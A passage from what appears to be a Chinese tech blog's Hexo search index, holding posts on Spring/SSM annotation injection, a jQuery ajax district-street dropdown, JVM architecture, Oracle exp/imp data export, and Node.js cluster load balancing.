class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@RequestMapping(value&#x3D;&quot;&#x2F;user&quot;)</span><br><span class="line">public class LoginController</span><br></pre></td></tr></table></figure><p>2) service层类的注解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Service(&quot;userService&quot;)</span><br><span class="line">public class UserServiceImpl implements UserService</span><br></pre></td></tr></table></figure><p>3) 在controller层类中定义service接口作为其属性并通过注解注入该接口的实现类的实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Resource</span><br><span class="line">@Qualifier(&quot;userService&quot;)</span><br><span class="line">private UserService userService;</span><br></pre></td></tr></table></figure><p>2) 配置注解支持及扫描注解所在的包<br>    1) dispatcher-servlet.xml配置文件中添加如下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 设置注解支持,扫描带有注解类的包 --&gt;</span><br><span class="line">&lt;context:component-scan base-package&#x3D;&quot;controller,service.impl&quot; &#x2F;&gt;</span><br><span class="line">&lt;mvc:annotation-driven &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>6、衔接service层与dao层<br>    service需要的是使用Spring容器中提供的sqlSessionTemplate会话模板, 所以service注入的是该会话模板对象<br>    由于sqlSessionTemplate已经在Spring的配置文件applicationContext.xml中定义了bean, 所以可以直接注入</p><p>1 在service类中定义属性sqlSessionTemplate </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private SqlSessionTemplate sqlSessionTemplate; </span><br></pre></td></tr></table></figure><p>2) 使用注解实现注入 </p><pre><code>@Resource@Qualifier(&quot;sqlSessionTemplate&quot;)private SqlSessionTemplate sqlSessionTemplate;</code></pre><p>7、web.xml中加载Spring配置文件applicationContext.xml<br>    由于sqlSessionTemplate在applicationContext.xml中定义的bean，当tomcat容器启动时就要完成controller注入service，<br>    service注入sqlSessionTemplate, 所以需要在web.xml中配置监听器加载applicationContext.xml配置文件, 这样tomcat容器在<br>    启动时会加载 dispatcher-servlet.xml 和 applicationCOntext.xml配置文件, 那么在客户端发起请求之前，这些注入全部都会<br>    提前完成。</p><pre><code>&lt;!-- Spring监听器 --&gt;&lt;context-param&gt;    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;    &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt;&lt;/context-param&gt;&lt;listener&gt;    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax实现区域-街道多级联动</title>
      <link href="ajax%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9F%9F-%E8%A1%97%E9%81%93%E5%A4%9A%E7%BA%A7%E8%81%94%E5%8A%A8.html"/>
      <url>ajax%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9F%9F-%E8%A1%97%E9%81%93%E5%A4%9A%E7%BA%A7%E8%81%94%E5%8A%A8.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" /><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><p>前端代码示例：</p><pre><code>$(document).ready(function()&#123;    $(&quot;#districtId&quot;).change(function()&#123;        //清空下拉框街道的选项        $(&quot;#streetId option:gt(0)&quot;).remove();        //获取要发送的数据        var districtIdVal = $(&quot;#districtId&quot;).val();        //如果没有选择区不进行ajax请求        if(null == districtIdVal || &quot;&quot; ==  districtIdVal)&#123;            return;        &#125;        //发送ajax请求        $.ajax(&#123;            &quot;url&quot;:&quot;&lt;%=path%&gt;/house/getStreetByAjax&quot;,    //请求的地址                            &quot;type&quot;:&quot;POST&quot;,    //发送请求的方式            &quot;data&quot;:&#123;&quot;districtId&quot;:districtIdVal&#125;,        //发送的数据            &quot;dataType&quot;:&quot;json&quot;,        //定义服务端返回的数据格式            &quot;success&quot;:function(data)&#123;    //响应成功的回调函数                 for(var i=0; i&lt;data.length; i++)&#123;                    var street = data[i];                    //创建option元素节点                    var $option = $(&quot;&lt;option value=&apos;&quot;+street.id+&quot;&apos;&gt;&quot;+street.name+&quot;&lt;/option&gt;&quot;);                    //将新节点添加到select标签下                    $(&quot;#streetId&quot;).append($option);                 &#125;            &#125;,            &quot;error&quot;:function(error)&#123;        //响应失败的回调函数                alert(&quot;请求失败:&quot; + error.status );            &#125;        &#125;);    &#125;)&#125;)</code></pre><p>后台代码示例：</p><pre><code>/*@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML　　数据，需要注意的呢，在使用此注解之后不会再走试图处理器，而是直接将数据写入到输入流中，他的效果等同于通过response对象输出指定格式的数据。*/@ResponseBody@RequestMapping(value=&quot;/getStreetByAjax&quot;)public List&lt;TStreet&gt; getStreetByAjax(Long districtId)&#123;    System.out.println(&quot;id = &quot; + districtId);    List&lt;TStreet&gt; streets = districtService.getStreetByDistrictId(districtId);    return streets;&#125;</code></pre><p>代码解析：</p><p>1、首先在区域(district)下拉列表绑定一个方法：当选项被改变时，执行以下步骤：<br>        1) 清空下拉框街道的选项(除了第一行)<br>        2) 获取用户选择的区域项的value值(就是了解用户选了哪个城区，好在后台查出这个市区对应的街道)<br>        3) 发送ajax请求(其实就是发送请求，和页面跳转、表单提交一个道理，只不过发出请求的不是整个页面，而是下拉框的个人行为，你可以这样理解)<br>        PS: $.ajax方法的参数，也就是括号里面的语句是json格式，写法是固定的，就是一行行键值对，键名是固定的属性，值的意思注释写了</p><p>2、前端代码的ajax请求被发送到后台，请求地址：<a href="http://localhost:8080/u3-springmvc-t66/house/getStreetByAjax">http://localhost:8080/u3-springmvc-t66/house/getStreetByAjax</a><br>        并且request中有一个json类型的参数————用户选择的市区的value值，根据请求地址执行后台HouseController中的getStreetByAjax方法<br>        1) 通过入参的方式拿到request中的市区id<br>        2) 调用service层的districtService的方法，根据id从数据库拿到该市区的所有街道的list集合(由于我们还没有service层，这里只是模拟实现一下)<br>        3) 把这个list以json形式返回(由注解：@ResponseBody自动实现)</p><p>3、最后这个后台响应返回前端页面，则响应成功，继续执行”success”:中的回调函数<br>        1) 将json形式的后台返回的街道的list遍历<br>        2) 拿出每一个街道实体，每一个实体建立一个option标签<br>        3) 把这些标签一个个补到下拉框下面<br>        PS: 由于这些操作都只是下拉框的个人行为，当用户选择一个市区选项时，看到的页面本身没有变化，但实际上脚本已经把街道选项框重新组装</p>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java详解jvm工作原理和流程</title>
      <link href="%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B.html"/>
      <url>%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><meta name="referrer" content="no-referrer"><!--页面头部添加--><p>作为一名Java使用者，掌握JVM的体系结构也是必须的。<br>说起Java，人们首先想到的是Java编程语言，然而事实上，Java是一种技术，它由四方面组成：Java编程语言、Java类文件格式、Java虚拟机和Java应用程序接口(Java API)。它们的关系如下图所示：<br><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131105235523390?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>运行期环境代表着Java平台，开发人员编写Java代码(.java文件)，然后将之编译成字节码(.class文件)，再然后字节码被装入内存，一旦字节码进入虚拟机，它就会被解释器解释执行，或者是被即时代码发生器有选择的转换成机器码执行。</p><p>Java平台由Java虚拟机和Java应用程序接口搭建，Java语言则是进入这个平台的通道，用Java语言编写并编译的程序可以运行在这个平台上。这个平台的结构如下图所示：<br><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106000002718?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>在Java平台的结构中, 可以看出，Java虚拟机(JVM) 处在核心的位置，是程序与底层操作系统和硬件无关的关键。它的下方是移植接口，移植接口由两部分组成：适配器和Java操作系统, 其中依赖于平台的部分称为适配器；JVM 通过移植接口在具体的平台和操作系统上实现；在JVM 的上方是Java的基本类库和扩展类库以及它们的API， 利用Java API编写的应用程序(application) 和小程序(Java applet) 可以在任何Java平台上运行而无需考虑底层平台, 就是因为有Java虚拟机(JVM)实现了程序与操作系统的分离，从而实现了Java 的平台无关性。 </p><p>JVM在它的生存周期中有一个明确的任务，那就是运行Java程序，因此当Java程序启动的时候，就产生JVM的一个实例；当程序运行结束的时候，该实例也跟着消失了。下面我们从JVM的体系结构和它的运行过程这两个方面来对它进行比较深入的研究。</p><p>1、Java虚拟机的体系结构</p><p>·每个JVM都有两种机制：</p><p>①类装载子系统：装载具有适合名称的类或接口</p><p>②执行引擎：负责执行包含在已装载的类或接口中的指令 </p><p>·每个JVM都包含：</p><p>方法区、Java堆、Java栈、本地方法栈、指令计数器及其他隐含寄存器</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131113150006437?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" class="lazyload"></p><p>对于JVM的学习，在我看来这么几个部分最重要：</p><p>Java代码编译和执行的整个过程<br>JVM内存管理及垃圾回收机制</p><p>下面分别对这几部分进行说明：</p><p>2、Java代码编译和执行的整个过程</p><p>也正如前面所说，Java代码的编译和执行的整个过程大概是：开发人员编写Java代码(.java文件)，然后将之编译成字节码(.class文件)，再然后字节码被装入内存，一旦字节码进入虚拟机，它就会被解释器解释执行，或者是被即时代码发生器有选择的转换成机器码执行。</p><p>（1）Java代码编译是由Java源码编译器来完成，也就是Java代码到JVM字节码（.class文件）的过程。 流程图如下所示：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131113150025609?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" class="lazyload"></p><p>（2）Java字节码的执行是由JVM执行引擎来完成，流程图如下所示：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131113150058015?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" class="lazyload"></p><p>Java代码编译和执行的整个过程包含了以下三个重要的机制:</p><p>·Java源码编译机制</p><p>·类加载机制</p><p>·类执行机制</p><p>（1）Java源码编译机制</p><p>Java 源码编译由以下三个过程组成：</p><p>①分析和输入到符号表</p><p>②注解处理</p><p>③语义分析和生成class文件</p><p>流程图如下所示：<br><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106003027687?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>最后生成的class文件由以下部分组成：</p><p>①结构信息：包括class文件格式版本号及各部分的数量与大小的信息</p><p>②元数据：对应于Java源码中声明与常量的信息。包含类/继承的超类/实现的接口的声明信息、域与方法声明信息和常量池</p><p>③方法信息：对应Java源码中语句和表达式对应的信息。包含字节码、异常处理器表、求值栈与局部变量区大小、求值栈的类型记录、调试符号信息</p><p>（2）类加载机制<br>JVM的类加载是通过ClassLoader及其子类来完成的，类的层次关系和加载顺序可以由下图来描述：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106003500328?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>①Bootstrap ClassLoader</p><p>负责加载$JAVA_HOME中jre/lib/rt.jar里所有的class，由C++实现，不是ClassLoader子类</p><p>②Extension ClassLoader</p><p>负责加载java平台中扩展功能的一些jar包，包括$JAVA_HOME中jre/lib/*.jar或-Djava.ext.dirs指定目录下的jar包</p><p>③App ClassLoader</p><p>负责记载classpath中指定的jar包及目录中class</p><p>④Custom ClassLoader</p><p>属于应用程序根据自身需要自定义的ClassLoader，如tomcat、jboss都会根据j2ee规范自行实现ClassLoader</p><p>加载过程中会先检查类是否被已加载，检查顺序是自底向上，从Custom ClassLoader到BootStrap ClassLoader逐层检查，只要某个classloader已加载就视为已加载此类，保证此类只所有ClassLoader加载一次。而加载的顺序是自顶向下，也就是由上层来逐层尝试加载此类。</p><p>（3）类执行机制</p><p>JVM是基于堆栈的虚拟机。JVM为每个新创建的线程都分配一个堆栈.也就是说,对于一个Java程序来说，它的运行就是通过对堆栈的操作来完成的。堆栈以帧为单位保存线程的状态。JVM对堆栈只进行两种操作:以帧为单位的压栈和出栈操作。</p><p>JVM执行class字节码，线程创建后，都会产生程序计数器（PC）和栈（Stack），程序计数器存放下一条要执行的指令在方法内的偏移量，栈中存放一个个栈帧，每个栈帧对应着每个方法的每次调用，而栈帧又是有局部变量区和操作数栈两部分组成，局部变量区用于存放方法中的局部变量和参数，操作数栈中用于存放方法执行过程中产生的中间结果。栈的结构如下图所示：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106003939906?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>3、JVM内存管理及垃圾回收机制</p><p>JVM内存结构分为：方法区（method），栈内存（stack），堆内存（heap），本地方法栈（java中的jni调用），结构图如下所示：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106010426437?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"><br>（1）堆内存（heap）</p><p>所有通过new创建的对象的内存都在堆中分配，其大小可以通过-Xmx和-Xms来控制。<br>操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中删除，并将该结点的空间分配给程序，另外，对于大多数系统，会在这块内存空间中的首地址处记录本次分配的大小，这样代码中的delete语句才能正确的释放本内存空间。但由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放入空闲链表中。这时由new分配的内存，一般速度比较慢，而且容易产生内存碎片，不过用起来最方便。另外，在WINDOWS下，最好的方式是用VirtualAlloc分配内存，它不是在堆，也不是在栈，而是直接在进程的地址空间中保留一块内存，虽然这种方法用起来最不方便，但是速度快，也是最灵活的。堆内存是向高地址扩展的数据结构，是不连续的内存区域。由于系统是用链表来存储的空闲内存地址的，自然是不连续的，而链表的遍历方向是由低地址向高地址。堆的大小受限于计算机系统中有效的虚拟内存。由此可见，堆获得的空间比较灵活，也比较大。</p><p>（2）栈内存（stack）</p><p>在Windows下, 栈是向低地址扩展的数据结构，是一块连续的内存区域。这句话的意思是栈顶的地址和栈的最大容量是系统预先规定好的，在WINDOWS下，栈的大小是固定的（是一个编译时就确定的常数），如果申请的空间超过栈的剩余空间时，将提示overflow。因此，能从栈获得的空间较小。只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出。 由系统自动分配，速度较快。但程序员是无法控制的。</p><p>堆内存与栈内存需要说明：</p><p>基础数据类型直接在栈空间分配，方法的形式参数，直接在栈空间分配，当方法调用完成后从栈空间回收。引用数据类型，需要用new来创建，既在栈空间分配一个地址空间，又在堆空间分配对象的类变量 。方法的引用参数，在栈空间分配一个地址空间，并指向堆空间的对象区，当方法调用完成后从栈空间回收。局部变量new出来时，在栈空间和堆空间中分配空间，当局部变量生命周期结束后，栈空间立刻被回收，堆空间区域等待GC回收。方法调用时传入的literal参数，先在栈空间分配，在方法调用完成后从栈空间收回。字符串常量、static在DATA区域分配，this在堆空间分配。数组既在栈空间分配数组名称，又在堆空间分配数组实际的大小。</p><p>如：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106012403140?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>（3）本地方法栈（java中的jni调用）</p><p>用于支持native方法的执行，存储了每个native方法调用的状态。对于本地方法接口，实现JVM并不要求一定要有它的支持，甚至可以完全没有。Sun公司实现Java本地接口(JNI)是出于可移植性的考虑，当然我们也可以设计出其它的本地接口来代替Sun公司的JNI。但是这些设计与实现是比较复杂的事情，需要确保垃圾回收器不会将那些正在被本地方法调用的对象释放掉。</p><p>（4）方法区（method）</p><p>它保存方法代码(编译后的java代码)和符号表。存放了要加载的类信息、静态变量、final类型的常量、属性和方法信息。JVM用持久代（Permanet Generation）来存放方法区，可通过-XX:PermSize和-XX:MaxPermSize来指定最小值和最大值。</p><p>垃圾回收机制</p><p>堆里聚集了所有由应用程序创建的对象，JVM也有对应的指令比如 new, newarray, anewarray和multianewarray，然并没有向 C++ 的 delete，free 等释放空间的指令，Java的所有释放都由 GC 来做，GC除了做回收内存之外，另外一个重要的工作就是内存的压缩，这个在其他的语言中也有类似的实现，相比 C++ 不仅好用，而且增加了安全性，当然她也有弊端，比如性能这个大问题。</p><p>4、Java虚拟机的运行过程示例</p><p>上面对虚拟机的各个部分进行了比较详细的说明，下面通过一个具体的例子来分析它的运行过程。</p><p>虚拟机通过调用某个指定类的方法main启动，传递给main一个字符串数组参数，使指定的类被装载，同时链接该类所使用的其它的类型，并且初始化它们。例如对于程序：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106013916750?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>编译后在命令行模式下键入： java HelloApp run virtual machine </p><p>将通过调用HelloApp的方法main来启动java虚拟机，传递给main一个包含三个字符串”run”、”virtual”、”machine”的数组。现在我们略述虚拟机在执行HelloApp时可能采取的步骤。</p><p>开始试图执行类HelloApp的main方法，发现该类并没有被装载，也就是说虚拟机当前不包含该类的二进制代表，于是虚拟机使用ClassLoader试图寻找这样的二进制代表。如果这个进程失败，则抛出一个异常。类被装载后同时在main方法被调用之前，必须对类HelloApp与其它类型进行链接然后初始化。链接包含三个阶段：检验，准备和解析。检验检查被装载的主类的符号和语义，准备则创建类或接口的静态域以及把这些域初始化为标准的默认值，解析负责检查主类对其它类或接口的符号引用，在这一步它是可选的。类的初始化是对类中声明的静态初始化函数和静态域的初始化构造方法的执行。一个类在初始化之前它的父类必须被初始化。整个过程如下：</p><p><img alt="这里写图片描述" data-src="https://img-blog.csdn.net/20131106014016937?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveF9wYW5kYQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导出服务器上oracle数据</title>
      <link href="%E5%AF%BC%E5%87%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8Aoracle%E6%95%B0%E6%8D%AE.html"/>
      <url>%E5%AF%BC%E5%87%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8Aoracle%E6%95%B0%E6%8D%AE.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" /><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><h2 id="导出服务器上oracle数据"><a href="#导出服务器上oracle数据" class="headerlink" title="导出服务器上oracle数据"></a>导出服务器上oracle数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlplus &#x2F; as  sysdba</span><br><span class="line"></span><br><span class="line">create user  test; identified by test;</span><br><span class="line"></span><br><span class="line">grant connect,resource,dba to test;</span><br><span class="line"></span><br><span class="line">exp test&#x2F;test@XE file&#x3D;d:\test.dmp full&#x3D;y;</span><br></pre></td></tr></table></figure><p>2 将数据库中system用户与sys用户的表导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp system&#x2F;manager@TEST file&#x3D;d:\daochu.dmp owner&#x3D;(system,sys)</span><br></pre></td></tr></table></figure><p>3 将数据库中的表table1 、table2导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp system&#x2F;manager@TEST file&#x3D;d:\daochu.dmp tables&#x3D;(table1,table2)</span><br></pre></td></tr></table></figure><p>导入 （本地环境cmd）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">imp system&#x2F;manager@TEST file&#x3D;d:\daochu.dmp ignore&#x3D;y</span><br><span class="line">imp system&#x2F;manager@TEST file&#x3D;d:\daochu.dmp tables&#x3D;(table1) ignore&#x3D;y</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cluster（集群）nodejs 均衡负载</title>
      <link href="%E5%9D%87%E8%A1%A1%E8%B4%9F%E8%BD%BD.html"/>
      <url>%E5%9D%87%E8%A1%A1%E8%B4%9F%E8%BD%BD.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" /><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><p>Node.js在单个线程中运行单个实例。 用户(开发者)为了使用现在的多核系统，有时候,用户(开发者)会用一串Node.js进程去处理负载任务。</p><p>cluster 模块允许简单容易的创建共享服务器端口的子进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const cluster &#x3D; require(&#39;cluster&#39;);</span><br><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line">const numCPUs &#x3D; require(&#39;os&#39;).cpus().length;</span><br><span class="line"></span><br><span class="line">if (cluster.isMaster) &#123;</span><br><span class="line">  console.log(&#96;主进程 $&#123;process.pid&#125; 正在运行&#96;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 衍生工作进程。</span><br><span class="line">  for (let i &#x3D; 0; i &lt; numCPUs; i++) &#123;</span><br><span class="line">    cluster.fork();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cluster.on(&#39;exit&#39;, (worker, code, signal) &#x3D;&gt; &#123;</span><br><span class="line">    console.log(&#96;工作进程 $&#123;worker.process.pid&#125; 已退出&#96;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; 工作进程可以共享任何 TCP 连接。</span><br><span class="line">  &#x2F;&#x2F; 在本例子中，共享的是一个 HTTP 服务器。</span><br><span class="line">  http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line">    res.writeHead(200);</span><br><span class="line">    res.end(&#39;你好世界\n&#39;);</span><br><span class="line">  &#125;).listen(8000);</span><br><span class="line"></span><br><span class="line">  console.log(&#96;工作进程 $&#123;process.pid&#125; 已启动&#96;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在运行 Node.js 将会在工作进程(指代子进程)之间共享8000端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ node server.js</span><br><span class="line">主进程 3596 正在运行</span><br><span class="line">工作进程 4324 已启动</span><br><span class="line">工作进程 4520 已启动</span><br><span class="line">工作进程 6056 已启动</span><br><span class="line">工作进程 5644 已启动</span><br></pre></td></tr></table></figure><p>请注意,在Windows中,还不能在工作进程中设置管道(Pipe)服务器。</p><p>工作原理</p><p>工作进程由child_process.fork()方法创建，因此它们可以使用IPC和父进程通信，从而使各进程交替处理连接服务。</p><p>cluster模块支持两种连接分发模式（将新连接安排给某一工作进程处理）。</p><p>第一种方法（也是除Windows外所有平台的默认方法），是循环法。由主进程负责监听端口，接收新连接后再将连接循环分发给工作进程。在分发中使用了一些内置技巧防止工作进程任务过载。</p><p>第二种方法是，主进程创建监听socket后发送给感兴趣的工作进程，由工作进程负责直接接收连接。</p><p>理论上第二种方法应该是效率最佳的，但在实际情况下，由于操作系统调度机制的难以捉摸，会使分发变得不稳定。我们遇到过这种情况：8个进程中的2个，分担了70%的负载。</p><p>因为server.listen()将大部分工作交给主进程完成，因此导致普通Node.js进程与cluster作业进程差异的情况有三种： 1. server.listen({fd: 7})由于文件描述符“7”是传递给父进程的，这个文件被监听后，将文件句柄（handle）传递给工作进程，而不是文件描述符“7”本身。 2. server.listen(handle) 明确监听句柄，会导致工作进程直接使用该句柄，而不是和父进程通信。 3. server.listen(0) 正常情况下，这种调用会导致server在随机端口上监听。但在cluster模式中，所有工作进程每次调用listen(0)时会收到相同的“随机”端口。实质上，这种端口只在第一次分配时随机，之后就变得可预料。如果要使用独立端口的话，应该根据工作进程的ID来生成端口号。</p><p>注意：Node.js不支持路由逻辑。因此在设计应用时，不应该过分依赖内存数据对象（如sessions和login等）。</p><p>由于各工作进程是独立的进程，它们可以根据需要随时关闭或重新生成，而不影响其他进程的正常运行。只要有存活的工作进程，服务器就可以继续处理连接。如果没有存活的工作进程，现有连接会丢失，新的连接也会被拒绝。Node.js不会自动管理工作进程的数量，而应该由具体的应用根据实际需要来管理进程池。</p><p>虽然cluster模块主要用于网络相关的情况，但同样可以用于其他需要worker进程的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo史上最全搭建教程</title>
      <link href="hexo%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B.html"/>
      <url>hexo%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B.html</url>
      
